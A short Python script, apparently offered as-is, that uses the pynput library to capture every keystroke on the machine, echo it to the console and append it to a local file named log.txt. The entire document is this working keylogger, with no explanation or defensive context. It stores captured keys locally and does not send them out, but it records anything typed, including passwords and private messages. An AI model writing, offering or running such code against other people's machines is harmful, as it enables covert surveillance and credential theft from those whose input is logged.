import pynput

from pynput.keyboard import Key, Listener

def on_press(key):
    print(f"{key} pressed")
    write_file(key)

def write_file(key):
    with open("log.txt", 'a') as logKey:    
        if hasattr(key, 'char') and key.char:   
            logKey.write(key.char)              
        else:
            logKey.write(f'[{key}]')

with Listener(on_press=on_press) as listener:
    listener.join()

